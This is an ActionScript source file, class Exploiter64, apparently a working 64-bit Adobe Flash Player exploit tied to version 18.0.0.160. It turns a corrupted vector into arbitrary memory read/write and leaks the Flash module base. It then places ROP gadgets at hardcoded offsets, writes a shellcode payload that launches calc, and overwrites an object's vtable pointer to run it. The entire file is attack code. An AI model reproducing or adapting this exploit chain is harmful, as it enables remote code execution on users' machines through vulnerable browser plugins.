package 
{
	/**
	 * ...
	 * @author dango
	 */
	import com.adobe.tvsdk.mediacore.utils.AuthorizedFeaturesHelper;
	import flash.utils.ByteArray;
	 
	public class Exploiter64 
	{
		private var BYTE_ARRAY_SIZE:Number = 0x3f8;
		private var SEARCH_LIMIT:Number = 0x280000 / 4;
		private const MAX_STRING_LENGTH:uint = 100;
		
		private var defrag:Vector.<Object> = new Vector.<Object>(750);
		
		private var payload_space:Vector.<uint> = new Vector.<uint>();
		private var ov:Vector.<Object> = new Vector.<Object>(2048);
		private var uv:Vector.<uint>;
		private var uv_orig_length:uint;
		
		private var ba_pos:uint;
		private var ba_orig_array:Address64;
		private var ba_orig_length:uint;
		private var ba_orig_capacity:uint;
		private var ba:ByteArray;
		
		
		private var uv_addr:Address64;
		private var vector_object_addr:Address64;
		private var this_addr:Address64;
		private var payload_space_object:Address64;
		private var payload_space_data:Address64;
		private var flash_ptr:Address64;
		private var vp_addr:Address64;
		private var magic:Address64;
		private var vtable:Address64;
		private var traits:Address64;
		private var core:Address64;
		private var exec:Address64;
		private var exec_vtable:Address64;
		private var offset_object_address:Address64;
		private var object_vtable_ptr:Address64;
		private var flash_base_address:Address64;
		
		public function Exploiter64(corrupted_vector:Vector.<uint>, original_length:uint) 
		{
			uv_orig_length = original_length;
			uv = corrupted_vector;
			uv[0] = 0xdaadbaaf;
			Logger.log("[*] uv corrupted length: " + uv.length.toString(16));
			
			for (var i:uint = 0; i < defrag.length; i++ ){
				defrag[i] = new Vector.<uint>(250);
			}
			
			for (var i:uint = 0; i < ov.length; i++ ){
				if (i % 2 == 0){
					ov[i] = new ByteArray();
					ov[i].length = 0x3f8;
					ov[i].position = 0;
					ov[i].endian = "littleEndian";
					ov[i].writeUnsignedInt(0xdeedbeef);
				} else{
					ov[i] = new Vector.<Object>(0x3f6);
					ov[i][0] =  this;
					ov[i][1] = payload_space;
					ov[i][2] = Magic;
				}
			}
			
			
			Logger.log('[*] Searching ByteArray');
			try{
				search_byte_array();
			} catch (err:Error) {
				Logger.log('[!] ba not found');
			}
			
			Logger.log('[*] ByteArray Info ' + ba_pos.toString(10) + ' ' + ba_orig_array.lo.toString(16) + '`' + ba_orig_array.hi.toString(16) );
			
			Logger.log('[*] Setting up new ba length');
			set_ba_length(0x1000);
			
			Logger.log('[*] Finding the BA from ov');
			for (i = 0; i < ov.length; i++ ){
				//Logger.log('[*] Finding at '+ i.toString());
				if (ov[i].length == 0x1000){
					ba = ov[i] as ByteArray;
					ba.position = 0;
					break;
				}
			}
			
			if (ba == null){
				Logger.log('[!] modified ba not found');
				return
			}
			Logger.log('[*] ba found at :' + ba_orig_array.toString());
			
			Logger.log('[*] Find uv data addr');
			uv_addr = new Address64(ba_orig_array.lo, ba_orig_array.hi);
			var leak:uint;
			i = 0;
			while (true){
				i = i + 1;
				/*Logger.log('[*] find uv data '+i.toString() );
				if (i > 0x6000){
					break;
				}*/
				leak = ba_read(uv_addr);
				if (leak == 0xdaadbaaf){
					uv_addr.lo = uv_addr.lo - 0x10;
					break;
				}
				uv_addr.lo = uv_addr.lo - 4;
			}
			
			Logger.log('[*] uv data found at ' + uv_addr.toString());
			
			payload_space.length = 0x6400;
			Logger.log('[*] Leak addresses');
			
			vector_object_addr = new Address64(ba_orig_array.lo, ba_orig_array.hi);
			leak = 0;
			i = 0;
			while (true){
				leak = ba_read(vector_object_addr);
				if (leak == 0x3f6){
					Logger.log('[*] Vector.<Object> found at ' + vector_object_addr.toString() );
					break;
				}
				vector_object_addr.lo = vector_object_addr.lo + 4;
			}
			
			this_addr = ba_read_addr(vector_object_addr.offset(0x8));
			this_addr.lo = this_addr.lo - 1;
			
			object_vtable_ptr = ba_read_addr(this_addr);
			
			//Only for Flash_18_0_0_160.ocx
			flash_base_address = new Address64(object_vtable_ptr.lo-0x1199110, object_vtable_ptr.hi);
			Logger.log('[*] vtable address at ' + object_vtable_ptr.toString());
			Logger.log('[*] Flash base address:' + flash_base_address.toString());
			
			//memory layout preparation
			ba_write_addr(new Address64(this_addr.lo+0x38, this_addr.hi), new Address64(uv_addr.lo, uv_addr.hi));
			ba_write_addr(new Address64(this_addr.lo+0x40, this_addr.hi), new Address64(flash_base_address.lo + 0x10864b8, flash_base_address.hi));
			//ba_write_addr(new Address64(this_addr.lo+0x40, this_addr.hi), new Address64(0x42424242, 0x42424242));
			
			ba_write_addr(new Address64(uv_addr.lo + 0x20, uv_addr.hi), new Address64(flash_base_address.lo + 0x4c8400, flash_base_address.hi));
			
			//first gadget
			ba_write_addr(new Address64(this_addr.lo + 0x260, this_addr.hi), new Address64(uv_addr.lo + 0x80, uv_addr.hi));
			ba_write_addr(new Address64(uv_addr.lo + 0x80, uv_addr.hi), new Address64(flash_base_address.lo + 0x107c8c0, flash_base_address.hi));
			
			//second gadget
			ba_write_addr(new Address64(uv_addr.lo + 0x78, uv_addr.hi), new Address64(flash_base_address.lo + 0x107e7b0, flash_base_address.hi));
			ba_write_addr(new Address64(uv_addr.lo + 0x23c0, uv_addr.hi), new Address64(uv_addr.lo + 0x1000, uv_addr.hi));
			ba_write_addr(new Address64(uv_addr.lo + 0x360, uv_addr.hi), new Address64(0x4000, 0)); //fake rdx
			
			//third gadget
			ba_write_addr(new Address64(uv_addr.lo + 0x1000, uv_addr.hi), new Address64(flash_base_address.lo + 0x11802e8, flash_base_address.hi));
			//ba_write_addr(new Address64(uv_addr.lo + 0x1000, uv_addr.hi), new Address64(0x40404040, 0x40404040));
			ba_write_addr(new Address64(uv_addr.lo + 0x1028, uv_addr.hi), new Address64(flash_base_address.lo + 0x819cb0, flash_base_address.hi)); //fake fun ptr
			ba_write_addr(new Address64(uv_addr.lo + 0x1030, uv_addr.hi), new Address64(0x1, 0)); //fake r8
			
			//writing shellcode
			ba_write_addr(new Address64(uv_addr.lo + 0x2000, uv_addr.hi), new Address64(0x55575653, 0x685a606a));
			ba_write_addr(new Address64(uv_addr.lo + 0x2008, uv_addr.hi), new Address64(0x636c6163, 0x29485954));
			ba_write_addr(new Address64(uv_addr.lo + 0x2010, uv_addr.hi), new Address64(0x8b4865d4, 0x768b4832));
			ba_write_addr(new Address64(uv_addr.lo + 0x2018, uv_addr.hi), new Address64(0x768b4818, 0x48ad4810));
			ba_write_addr(new Address64(uv_addr.lo + 0x2020, uv_addr.hi), new Address64(0x8b48308b, 0x5703307e));
			ba_write_addr(new Address64(uv_addr.lo + 0x2028, uv_addr.hi), new Address64(0x175c8b3c, 0x1f748b28));
			ba_write_addr(new Address64(uv_addr.lo + 0x2030, uv_addr.hi), new Address64(0xfe014820, 0x241f548b));
			ba_write_addr(new Address64(uv_addr.lo + 0x2038, uv_addr.hi), new Address64(0x172cb70f, 0xad02528d));
			ba_write_addr(new Address64(uv_addr.lo + 0x2040, uv_addr.hi), new Address64(0x57073c81, 0x75456e69));
			ba_write_addr(new Address64(uv_addr.lo + 0x2048, uv_addr.hi), new Address64(0x1f748bef, 0xfe01481c));
			ba_write_addr(new Address64(uv_addr.lo + 0x2050, uv_addr.hi), new Address64(0x48ae348b, 0xff99f701));
			ba_write_addr(new Address64(uv_addr.lo + 0x2058, uv_addr.hi), new Address64(0xc48348d7, 0x5e5f5d68));
			ba_write_addr(new Address64(uv_addr.lo + 0x2060, uv_addr.hi), new Address64(0x41414168, 0xc341));
			
			ba_write_addr(new Address64(this_addr.lo + 0xf0, this_addr.hi), new Address64(flash_base_address.lo + 0x1180300, flash_base_address.hi));
			ba_write_addr(new Address64(this_addr.lo + 0x118, this_addr.hi), new Address64(uv_addr.lo+0x2000, uv_addr.hi));
			//ba_write_addr(new Address64(uv_addr.lo + 0x218, uv_addr.hi), new Address64(uv_addr.lo+0x2000, uv_addr.hi));
			Logger.log('[*] uv data found at ' + uv_addr.toString());
			//start to exploit
			ba_write_addr(this_addr, new Address64(uv_addr.lo - 0x80, uv_addr.hi));
			//ba_write_addr(this_addr, new Address64(0x41414141, 0x41414141));
			
			
			
			//offset_object_address = ba_read_addr(this_addr + 0x8);
			Logger.log('[*] this ptr found at ' + uv_addr.toString() );
			//ba_write_addr(offset_object_address, new Address64(0x42424242, 0x42424242));
			//ba_write_addr(this_addr+0x38, new Address64(0, 0));
			//ba_write_addr(this_addr+0x260, new Address64(0x43434343, 0x43434343));
			
			
			
			for (var i:uint = 0; i < ov.length; i++ ){
				if (i % 2 == 1){
					ov[i].toString();
				}
			}
		}
		
		static function Magic(...a){}
		
		private function search_byte_array():void{
			var hi, lo:uint;
			for (var i:uint = 0; i < SEARCH_LIMIT; i++ )
			{
				if (uv[i + 2] == 0x3f8 && uv[i + 3] == 0x3f8){
					ba_orig_capacity = 0x3f8;
					ba_orig_length = 0x3f8;
					lo = uv[i];
					hi = uv[i + 1];
					ba_orig_array = new Address64(lo, hi);
					ba_pos = i;
					return;
				}
			}
			throw new Error();
		}
		
		private function set_ba_length(new_length:uint):void{
			uv[ba_pos + 2] = new_length;
			uv[ba_pos + 3] = new_length;
		}
		
		private function set_ba_array(ptr:Address64):void{
			uv[ba_pos] = ptr.lo;
			uv[ba_pos + 1] = ptr.hi;
		}
		
		private function restore_ba():void{
			set_ba_array(ba_orig_array);
			set_ba_length(0x3f8);
		}
		
		public function ba_read(addr:Address64):uint{
			set_ba_array(addr);
			ba.position = 0;
			return ba.readUnsignedInt();
		}
		
		public function ba_read_word(addr:Address64):uint{
			set_ba_array(addr);
			ba.position = 0;
			return ba.readUnsignedShort();
		}
		
		public function ba_write(addr:Address64, val:uint):void{
			set_ba_array(addr);
			ba.position = 0;
			ba.writeUnsignedInt(val);
		}
		
		public function ba_read_addr(addr:Address64):Address64{
			var hi, lo:uint;
			set_ba_array(addr);
			ba.position = 0;
			lo = ba.readUnsignedInt();
			hi = ba.readUnsignedInt();
			return new Address64(lo, hi);
		}
		
		public function ba_write_addr(addr:Address64, val:Address64):void{
			set_ba_array(addr);
			ba.position = 0;
			ba.writeUnsignedInt(val.lo);
			ba.writeUnsignedInt(val.hi);
		}
		
		public function read_string(addr:Address64, length:uint = 0):String{
			set_ba_array(addr);
			ba.position = 0;
			if (length == 0){
				return ba.readUTFBytes(MAX_STRING_LENGTH);
			}
			else
			{
				return ba.readUTFBytes(length);
			}
		}
		
	}

}
